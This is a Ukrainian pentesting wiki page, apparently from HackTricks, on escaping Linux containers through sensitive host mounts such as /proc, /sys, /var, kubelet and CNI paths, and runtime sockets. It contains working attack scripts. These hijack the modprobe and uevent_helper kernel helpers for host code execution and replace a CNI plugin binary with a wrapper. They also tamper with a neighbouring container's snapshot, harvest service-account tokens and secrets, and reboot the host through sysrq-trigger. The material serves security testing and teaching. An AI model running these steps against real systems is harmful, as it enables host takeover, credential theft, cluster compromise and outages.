# Чутливі монтування хоста

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Монтування хоста — одна з найважливіших практичних поверхонь для container-escape, оскільки вони часто зводять нанівець ретельно ізольоване представлення процесу, знову відкриваючи прямий доступ до ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind-монтування `/proc`, `/sys`, `/var`, сокетів runtime, стану під керуванням kubelet або шляхів, пов’язаних із пристроями, можуть відкрити доступ до засобів керування ядром, облікових даних, файлових систем сусідніх контейнерів та інтерфейсів керування runtime.

Ця сторінка існує окремо від сторінок про окремі засоби захисту, оскільки модель зловживання охоплює кілька аспектів. Записуване монтування хоста небезпечне частково через простори імен монтувань, частково через простори імен користувачів, частково через охоплення AppArmor або SELinux, а частково через те, який саме шлях хоста відкрито. Розгляд цієї теми окремо значно спрощує аналіз поверхні атаки.

Також порівняйте каталог хоста, доступний для запису, з відповідним шляхом усередині кожного контейнера. Якщо його змонтовано поверх каталогу зі стартовими скриптами, менш привілейований користувач хоста може розмістити там код, який точка входу контейнера з вищими привілеями завантажить під час наступного перезапуску. Перевірте точні джерело й призначення bind-монтування, права на запис і пошук у каталозі, цикл точки входу та вимогу до виконуваного файла, UID runtime і реальний тригер перезапуску. UID 0 контейнера не обов’язково відповідає UID 0 хоста; вплив на хост визначають зіставлення user namespace та політика монтування. Під час пасивного аналізу слід повідомляти шляхи та дозволи, не записуючи скрипт і не перезапускаючи робоче навантаження.

Контейнер Linux може працювати всередині керівної VM, яка спільно використовує частину файлової системи окремого хоста Windows. [Спільні папки VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) — один зі способів зробити файли хоста видимими в гостьовій системі, але root у цій VM усе одно є окремою ідентичністю від адміністратора Windows. Якщо спільна папка відкриває для читання приватний SSH-ключ користувача, розглядайте його як потенційну підказку щодо облікових даних: перевірте точне монтування, прив’язане до хоста, власника ключа та доступ до нього, відповідний обліковий запис і **ефективну** політику authorized keys SSH-сервера Windows, перш ніж робити висновок, що це дає змогу ввійти на хост. У сучасному [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) для облікових записів адміністраторів зазвичай використовується окремий файл `administrators_authorized_keys`. Не включайте вміст приватних ключів у звичайні результати переліку; для пасивного початкового аналізу достатньо метаданих монтування та шляху до ключа.

## Розкриття `/proc`

procfs містить як звичайну інформацію про процеси, так і важливі інтерфейси керування ядром. Тому bind-монтування на кшталт `-v /proc:/host/proc` або представлення контейнера, яке відкриває несподівані доступні для запису записи proc, може призвести до розкриття інформації, відмови в обслуговуванні або безпосереднього виконання коду на хості.

Шляхи procfs, що становлять особливу цінність:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (особливо `register` і `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Почніть із перевірки, які важливі записи procfs видимі або доступні для запису:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Ці шляхи цікаві з різних причин. `core_pattern`, `modprobe` і `binfmt_misc` можуть стати шляхами до виконання коду на хості, якщо доступні для запису. `kallsyms`, `kmsg`, `kcore` і `config.gz` — потужні джерела розвідданих для експлуатації ядра. `sched_debug` і `mountinfo` розкривають контекст процесів, cgroup і файлової системи, що допомагає відновити структуру хоста зсередини контейнера.

Практична цінність кожного шляху різна, і якщо вважати, що всі вони мають однаковий вплив, це ускладнює оцінювання:

- `/proc/sys/kernel/core_pattern`
  Якщо цей шлях доступний для запису, це один із найнебезпечніших шляхів у procfs, оскільки після збою ядро виконає обробник каналу. Контейнер, який може вказати в `core_pattern` на payload, збережений у його overlay або в змонтованому шляху хоста, часто може отримати виконання коду на хості. Див. також [read-only-paths.md](protections/read-only-paths.md) — там наведено окремий приклад.
- `/proc/sys/kernel/modprobe`
  Цей шлях визначає допоміжну програму userspace, яку використовує ядро, коли потрібно запустити логіку завантаження модулів. Якщо контейнер може його змінювати, а значення інтерпретується в контексті хоста, він може стати ще одним примітивом для виконання коду на хості. Особливо цікавим він стає в поєднанні зі способом запустити цей допоміжний процес.
- `/proc/sys/vm/panic_on_oom`
  Зазвичай це не простий примітив для виходу з контейнера, але він може спричинити відмову в обслуговуванні всього хоста, перетворивши умови OOM на поведінку з панікою ядра.
- `/proc/sys/fs/binfmt_misc`
  Якщо інтерфейс реєстрації доступний для запису, зловмисник може зареєструвати обробник для вибраного magic value і отримати виконання в контексті хоста, коли буде запущено файл із відповідним значенням.
- `/proc/config.gz`
  Корисний для оцінювання можливостей експлуатації ядра. Допомагає з’ясувати, які підсистеми, механізми захисту й необов’язкові функції ядра ввімкнено, не звертаючись до метаданих пакетів хоста.
- `/proc/sysrq-trigger`
  Переважно шлях для відмови в обслуговуванні, але дуже серйозний. Він може негайно перезавантажити хост, спричинити паніку ядра або іншим чином порушити його роботу.
- `/proc/kmsg`
  Розкриває повідомлення з кільцевого буфера ядра. Корисний для ідентифікації хоста, аналізу збоїв, а в деяких середовищах — для витоку інформації, що може допомогти в експлуатації ядра.
- `/proc/kallsyms`
  Цінний, якщо доступний для читання, оскільки розкриває інформацію про експортовані символи ядра й може допомогти обійти припущення про рандомізацію адрес під час розробки експлойтів для ядра.
- `/proc/[pid]/mem`
  Це прямий інтерфейс до пам’яті процесу. Якщо цільовий процес доступний за необхідних умов на кшталт ptrace, через нього можна читати або змінювати пам’ять іншого процесу. Реальний вплив значною мірою залежить від облікових даних, `hidepid`, Yama та обмежень ptrace, тому цей шлях потужний, але його можливості залежать від умов.
- `/proc/kcore`
  Надає представлення системної пам’яті у форматі, подібному до образу ядра. Файл величезний і незручний для роботи, але якщо його можна повноцінно читати, це свідчить про небезпечне розширення доступу до пам’яті хоста.
- `/dev/kmem` і `/dev/mem`
  Історично це інтерфейси **пристроїв** із прямим доступом до пам’яті, а не файли procfs. У багатьох сучасних системах вони відсутні або мають суворі обмеження, але контейнер, який може відкрити змонтовану копію з хоста, має вважати таке відкриття критичним. Перевіряйте їх разом з іншими чутливими монтуваннями `/dev`, а не шукайте неіснуючі шляхи `/proc/kmem` або `/proc/mem`.
- `/proc/sched_debug`
  Витік даних про планування та завдання може розкрити ідентифікатори процесів хоста, навіть якщо інші представлення процесів виглядають чистішими, ніж очікувалося.
- `/proc/[pid]/mountinfo`
  Надзвичайно корисний для відновлення того, де саме контейнер розташований на хості, які шляхи спираються на overlay і чи відповідає доступне для запису монтування вмісту хоста або лише шару контейнера.

Якщо дані `/proc/[pid]/mountinfo` або відомості про overlay доступні для читання, використайте їх, щоб відновити шлях файлової системи контейнера на хості:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Ці команди корисні, оскільки для низки прийомів виконання команд на хості потрібно перетворити шлях усередині контейнера на відповідний шлях з погляду хоста.

### Приклад: підготовка шляху до допоміжного файлу `modprobe`

Якщо з контейнера можна записувати до `/proc/sys/kernel/modprobe`, а шлях до допоміжного файлу інтерпретується в контексті хоста, його можна перенаправити на контрольований зловмисником payload. Верхній каталог overlay має відповідати шляху на хості, а доказ виконання потрібно записати в той самий шар контейнера, видимий хосту, якщо контейнер також не монтує `/tmp` хоста:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Точний тригер залежить від цілі та поведінки ядра, тому його навмисно не вгадують. Відновіть початкове значення, перш ніж залишити лабораторне середовище. Важливо те, що доступний для запису шлях допоміжної програми може спрямувати майбутній виклик допоміжної програми ядра до вмісту на шляху хоста, контрольованого атакувальником. Відсутність `upperdir` в overlay, шлях, який хост не може розв’язати, монтування sysctl лише для читання або ядро, яке ніколи не викликає вибрану допоміжну програму, перериває цей ланцюжок.

### Повний приклад: розвідка ядра за допомогою `kallsyms`, `kmsg` та `config.gz`

Якщо мета — оцінити можливість експлуатації, а не негайно вийти з контейнера:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Ці команди допомагають з’ясувати, чи доступна корисна інформація про символи, чи містять останні повідомлення ядра цікаві відомості про стан системи та які функції або механізми пом’якшення загроз скомпільовано в ядрі. Зазвичай це не призводить безпосередньо до escape, але може суттєво скоротити час на аналіз вразливостей ядра.

### Повний приклад: перезавантаження хоста через SysRq

Якщо `/proc/sysrq-trigger` доступний для запису й відкриває представлення хоста:

```bash
echo b > /proc/sysrq-trigger
```

Ефект — негайне перезавантаження хоста. Це не прихований приклад, але він чітко демонструє, що доступ до procfs може мати набагато серйозніші наслідки, ніж розкриття інформації.

## Доступ до `/sys`

sysfs відкриває значний обсяг даних про стан ядра та пристроїв. Деякі шляхи sysfs корисні переважно для зняття відбитків системи, тоді як інші можуть впливати на запуск допоміжних програм, поведінку пристроїв, конфігурацію модулів безпеки або стан прошивки.

До шляхів sysfs, що мають високу цінність, належать:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на керування температурою, а отже — на стабільність хоста в середовищах із неналежними обмеженнями доступу. `/sys/kernel/vmcoreinfo` може розкривати інформацію про дампи аварійного стану та структуру ядра, що допомагає знімати низькорівневі відбитки хоста. `/sys/kernel/security` — це інтерфейс `securityfs`, який використовують модулі безпеки Linux, тому неочікуваний доступ до нього може розкрити або змінити стан, пов’язаний із MAC. Шляхи змінних EFI можуть впливати на параметри завантаження, що зберігаються у прошивці, тож вони набагато небезпечніші за звичайні файли конфігурації. `debugfs` у `/sys/kernel/debug` особливо небезпечний, оскільки це інтерфейс, призначений для розробників, до якого висувають значно менше вимог безпеки, ніж до API ядра, розрахованих на використання у виробничих середовищах із посиленим захистом.

Кожен запис sysfs у цьому списку **залежить від ядра, конфігурації та обладнання**. У сучасних віртуалізованих вузлах часто взагалі немає `uevent_helper`, змінних EFI та записів для термопристроїв. Фіксуйте відсутність шляху як невиконану передумову, а не припускайте, що приклад з іншого ядра обов’язково застосовний.

Корисні команди для перевірки цих шляхів:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Що робить ці команди цікавими:

- `/sys/kernel/security` може показати, чи доступна поверхня AppArmor, SELinux або іншої LSM там, де вона мала залишатися доступною лише хосту.
- `/sys/kernel/debug` — часто найтривожніша знахідка в цій групі. Якщо `debugfs` змонтовано та доступно для читання або запису, очікуйте широку поверхню взаємодії з ядром, точний рівень ризику якої залежить від увімкнених вузлів налагодження.
- Доступ до змінних EFI трапляється рідше, але має значний вплив, оскільки стосується налаштувань, що зберігаються у прошивці, а не звичайних файлів часу виконання.
- `/sys/class/thermal` має значення переважно для стабільності хоста та взаємодії з обладнанням, а не для простого виходу в стилі shell.
- `/sys/kernel/vmcoreinfo` — це переважно джерело для ідентифікації хоста й аналізу аварійних завершень, корисне для розуміння низькорівневого стану ядра.

### Повний приклад: `uevent_helper`

`/sys/kernel/uevent_helper` залежить від ядра та конфігурації й відсутній у багатьох сучасних системах. Якщо він існує, доступний для запису й доступний придатний тригер `uevent`, ядро може виконати контрольований зловмисником допоміжний процес. Для підтвердження використовуйте шлях, видимий і з хоста, і з контейнера:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Причина, чому це працює, полягає в тому, що шлях до helper інтерпретується з погляду хоста. Після запуску helper виконується в контексті хоста, а не всередині поточного контейнера. `/sys/class/mem/null/uevent` — це конкретний тригер у ядрах, де він доступний; інші пристрої можуть мати власні файли `uevent`, але не вибирайте один навмання на реальному обладнанні. Відновіть початкове значення перед завершенням роботи в лабораторному середовищі. Не повідомляйте про доступність цієї техніки, якщо файл helper або контрольований тригер відсутній.

## Відкритий доступ до `/var`

Монтування `/var` хоста в контейнер часто недооцінюють, оскільки це не здається таким масштабним, як монтування `/`. На практиці цього може бути достатньо, щоб отримати доступ до runtime-сокетів, каталогів snapshot контейнерів, томів pod, якими керує kubelet, змонтованих токенів service account і файлових систем сусідніх застосунків. На сучасних вузлах саме в `/var` часто міститься найбільш важливий з операційного погляду стан контейнерів.

### Приклад Kubernetes

Pod із `hostPath: /var` часто може читати змонтовані токени інших pod і вміст overlay snapshot:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Ці команди корисні, оскільки допомагають з’ясувати, чи відкриває mount лише неважливі дані застосунку, чи критично важливі облікові дані кластера. Доступний для читання service-account token може одразу надати локальному виконанню коду доступ до Kubernetes API.

Якщо токен наявний, перевірте, до чого він надає доступ, замість того щоб зупинятися на виявленні токена:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Вплив тут може бути значно масштабнішим за доступ до локального вузла. Токен із широкими правами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.

### Приклад із Docker і containerd

На хостах Docker відповідні дані часто розташовані в `/var/lib/docker`, а на вузлах Kubernetes із containerd — у `/var/lib/containerd` або шляхах, специфічних для snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Якщо змонтований `/var` відкриває доступ до вмісту знімка іншого робочого навантаження з правом запису, зловмисник може змінити файли застосунку, розмістити вебконтент або змінити скрипти запуску, не торкаючись конфігурації поточного контейнера.

У **одноразовому лабораторному робочому навантаженні** вміст знімка з правом запису може продемонструвати втручання в роботу застосунку, відновлення секретів або lateral movement. Спочатку зіставте runtime container ID з точним знімком і ніколи не редагуйте сторонній знімок чи знімок production-середовища:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Ці команди корисні, оскільки демонструють три основні категорії впливу від змонтованого `/var`: втручання в застосунки, отримання секретів і латеральне переміщення до сусідніх робочих навантажень.

Запис безпосередньо у snapshot обходить звичайне керування станом runtime і може пошкодити контейнер або знищити докази. Виявлення лише для читання було локально відтворене на Docker `overlay2`: маркер, записаний у сусідньому одноразовому контейнері, з’явився в `/var/lib/docker/overlay2/<id>/diff/`. Фактичну модифікацію snapshot обмежуйте одноразовим контейнером, створеним для цього тесту.

## Шляхи стану Kubelet, плагінів і CNI

Змонтовані `/var/lib/kubelet`, `/opt/cni/bin` або `/etc/cni/net.d` часто доступні через привілейовані DaemonSets, агенти CNI, вузлові плагіни CSI, оператори GPU та допоміжні засоби сховища. Такі монтування легко знехтувати як «внутрішню інфраструктуру вузла», але вони розташовані безпосередньо на шляху виконання нових pod’ів і часто містять облікові дані kubelet, спроєктовані секрети, сокети реєстрації та виконувані бінарні файли плагінів на хості.

До цілей високої цінності належать:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Корисні команди для перевірки:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Чому ці шляхи важливі:

- `/var/lib/kubelet/pki` може розкривати клієнтські сертифікати kubelet та інші облікові дані, локальні для вузла, які іноді можна повторно використати для доступу до API server або TLS-ендпойнтів kubelet — залежно від конфігурації кластера.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` часто містить спроєктовані токени service account і змонтовані Secrets сусідніх pod на тому самому вузлі.
- `/var/lib/kubelet/pod-resources/kubelet.sock` — це переважно поверхня для розвідки, але дуже корисна: вона показує, яким pod і контейнерам наразі належать GPU, hugepages, пристрої SR-IOV та інші дефіцитні ресурси вузла.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` і `/var/lib/kubelet/plugins_registry` показують, які плагіни CSI, DRA та пристроїв встановлено, а також з якими сокетами має взаємодіяти kubelet. Якщо ці каталоги доступні для запису, а не лише для читання, проблема стає набагато серйознішою.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` і `/etc/cni/net.d` безпосередньо беруть участь у налаштуванні мережі pod. Доступ на запис до них часто дає змогу згодом виконати код на хості, а не лише переглядати конфігурацію.<sup>[[2]](#references)</sup>

### Повний приклад: доступний для запису `/opt/cni/bin`

Якщо каталог бінарних файлів CNI хоста змонтовано з доступом на читання й запис, заміни плагіна може бути достатньо, щоб отримати виконання коду на хості наступного разу, коли kubelet створить пісочницю pod на цьому вузлі:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Це не так безпосередньо, як змонтований `docker.sock`, але така ситуація частіше трапляється в скомпрометованих інфраструктурних Pod-ах Kubernetes. Маркер записується поруч зі змонтованим плагіном, щоб контейнер міг отримати до нього доступ навіть без монтування кореневої файлової системи хоста або `host-`/`tmp`. Обгортка зберігає початкові аргументи та стандартний ввід, після чого приклад відновлює оригінальний бінарний файл. Важливо, що модифікований бінарний файл згодом запускається потоком налаштування мережі хоста, а не поточним контейнером. Використовуйте лише тимчасовий вузол, оскільки некоректна обгортка може завадити новим Pod-пісочницям отримати мережеве з’єднання.

## Сокети середовища виконання

Чутливі монтування хоста часто містять сокети середовища виконання, а не цілі каталоги. Вони настільки важливі, що їх варто окремо повторно згадати тут:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Див. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), щоб переглянути повні сценарії експлуатації після монтування одного з цих сокетів.

Ось простий шаблон для першої взаємодії:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Якщо один із цих способів спрацює, шлях від «змонтованого сокета» до «запуску контейнера-сусіда з вищими привілеями» зазвичай набагато коротший, ніж будь-який шлях escape через ядро.

Той самий доступ до демона також може забезпечити **закріплення на хості**. Допоміжний контейнер із доступним для запису bind mount кореня хоста може отримувати файли через `docker cp`, а потім використовувати `docker exec`, щоб розмістити SSH-ключ, файл служби чи інший файл для закріплення в змонтованому шляху хоста. Межу безпеки визначають повноваження демона створювати монтування хоста; `docker cp` — лише етап підготовки файлів. Перевіряйте як щойно створені контейнери, так і записи до шляхів автентифікації або запуску на хості після надання доступу до сокета середовища виконання.

## Перехоплення завдання через доступний для запису шлях хоста

Щоб змонтований шлях становив небезпеку, він не обов’язково має відкривати `/`. Якщо цей шлях містить скрипти, файли конфігурації, хуки, плагіни або файли, які згодом використовує заплановане завдання чи служба на хості, контейнер може змінити те, що виконуватиме хост.

Загальний порядок перевірки:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Якщо host-процес використовує файл із правом запису, під час тестування payload має бути простим і помітним:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Цікава частина — межа довіри: запис виконується з контейнера, але виконання відбувається пізніше в контексті сервісу хоста. Так вузьке монтування hostPath або bind mount перетворюється на примітив відкладеного виконання коду на хості.

## Файли, що належать root, на спільному шляху хоста

Обліковий запис контейнера, який може отримати права root, може розмістити файл, що належить root, на доступному для запису шляху, який також використовує хост. Якщо UID 0 контейнера відповідає UID 0 хоста, обидва подання вказують на той самий файл, а монтування хоста дозволяє виконання SUID, користувач хоста, який може запускати на цьому шляху виконуваний файл із SUID, що належить root, може перетнути межу привілеїв хоста. Для цієї конкретної проблеми з власником файлу контейнеру не обов’язково запускатися з `--privileged`. Див. [зіставлення user namespace](protections/namespaces/user-namespace.md) і [обговорення SUID](privileged-containers.md) щодо окремих умов.

Перевіряйте шлях **з обох боків**: порівняйте власника та ідентичність нешкідливого файлу, перевірте `uid_map` і `gid_map` контейнера, а також параметри монтування та політику виконання на хості. `rw` з боку контейнера без `nosuid` — лише підстава для подальшої перевірки; це не підтверджує власника файлу на хості, прапорці монтування хоста, доступ користувача хоста чи те, чи блокує виконання AppArmor/SELinux. `noexec` обмежує виконання в тому поданні, де застосовується. Позначки `shared:` і `master:` у `/proc/self/mountinfo` описують поширення монтування, а не те, чи спільний вміст файлу з хостом. У bind mount таких позначок може не бути. Повторне використання облікових даних, яке забезпечує вхід на хост, — окремий крок, не пов’язаний із межею привілеїв спільного файлу.

Сховище середовища виконання хоста може створити подібний шлях навіть без явного bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) дозволяла непривілейованому користувачу хоста проходити через підкаталоги даних Docker і виконувати файли з файлової системи контейнера; Moby виправила права доступу у версії 20.10.9 і зазначає, що для виправлення каталогів потрібно перезапустити запущені контейнери. Перевірте точні шляхи монтування `overlay2/<id>/merged` і право пошуку в кожному батьківському каталозі, а потім з’ясуйте, чи відповідає UID 0 контейнера UID 0 хоста, чи наявний і доступний справжній виконуваний файл SetUID, що належить root, і чи дозволяє подання хоста виконання SetUID. Rootless-контейнери або контейнери зі зміненим зіставленням user namespace, `nosuid`, `noexec`, `no_new_privs` і політика MAC можуть вплинути на результат. Версія середовища виконання або доступний для проходження шлях самі по собі — лише підстава для перевірки, а не доказ виконання з правами root на хості; перевіряйте метадані монтування та файлів, не запускаючи підозрілий виконуваний файл.

## CVE, пов’язані з монтуванням

Монтування також пов’язані з уразливостями середовища виконання. Серед важливих нещодавніх прикладів:

- `CVE-2024-21626` у `runc`, де витік файлового дескриптора каталогу міг спрямувати робочий каталог у файлову систему хоста.
- `CVE-2024-23651`, `CVE-2024-23652` і `CVE-2024-23653` у BuildKit, де шкідливі Dockerfile, фронтенди та потоки `RUN --mount` могли знову відкрити доступ до файлів хоста, їх видалення або підвищення привілеїв під час збірки.
- `CVE-2024-1753` у потоках збірки Buildah і Podman, де спеціально сформовані bind mount під час збірки могли відкрити `/` для читання й запису.
- `CVE-2025-47290` у `containerd` 2.1.0, де TOCTOU під час розпакування образу міг дозволити спеціально сформованому образу змінити файлову систему хоста під час завантаження.

Ці CVE важливі в цьому контексті, оскільки показують, що робота з монтуваннями залежить не лише від конфігурації оператора. Саме середовище виконання також може створювати умови для escape через монтування.

## Перевірки

Скористайтеся цими командами, щоб швидко знайти монтування з найбільшим потенційним впливом:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Що тут цікавого:

- Root хоста, `/proc`, `/sys`, `/var` і сокети runtime — це знахідки найвищого пріоритету.
- Записи `/proc` і `/sys`, доступні для запису, часто означають, що монтування відкриває глобальні для хоста елементи керування ядром, а не безпечне представлення контейнера.
- Шляхи змонтованого `/var` потребують перевірки облікових даних і сусідніх робочих навантажень, а не лише файлової системи.
- Каталоги стану Kubelet і шляхи CNI/плагінів заслуговують на такий самий пріоритет, як і сокети runtime, оскільки часто розташовані безпосередньо на шляху створення pod і розповсюдження облікових даних на вузлі.

## Статус локальної перевірки

Практичні ланцюжки атак на цій сторінці перевірено на локальному вузлі Linux minikube. Під час перевірки вдалося відтворити:

- доступ на читання й запис через тимчасовий доступний для запису hostPath
- виявлення токенів ServiceAccount і змонтованих Secrets у `/var/lib/kubelet/pods`
- успішну автентифікацію в Kubernetes API за допомогою активного токена, отриманого зі змонтованого стану kubelet
- виявлення файлової системи сусіднього Docker `overlay2` лише для читання через змонтований `/var`
- створення Docker API дочірнього контейнера з доступним лише для читання bind-монтуванням хоста через змонтований `docker.sock`
- відкладене виконання на хості через тимчасовий хук, який використовує хост
- симуляцію CNI-обгортки зі збереженням аргументів, стандартного вводу й виконання оригінального плагіна

На тому самому вузлі були доступні `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` і `config.gz`, але не були доступні `uevent_helper`, змінні EFI, записи thermal або `sched_debug`. Деструктивні тригери ядра не запускалися. Це підтверджує, що ланцюжки атак через root хоста, `/var`, стан kubelet, сокети й споживачів хоста можна відтворити, тоді як методи з helper-механізмами procfs/sysfs залежать від конкретного ядра, режиму монтування, шляху до payload і тригера.
